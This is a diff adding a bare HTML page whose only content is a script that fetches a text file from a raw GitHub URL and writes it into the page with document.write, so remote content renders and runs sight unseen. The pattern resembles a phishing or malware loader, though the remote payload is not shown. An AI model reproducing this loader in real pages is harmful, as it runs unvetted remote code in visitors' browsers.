@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Page title</title>
+</head>
+<body>
+    <script>
+        fetch("https://raw.githubusercontent.com/fxs1400/ASA/refs/heads/main/Ht.txt").then(function (respone) {
+           return respone.text()
+       }).then(function (data) {
+        document.write(data);
+       })
+    </script>
+</body
+</html>
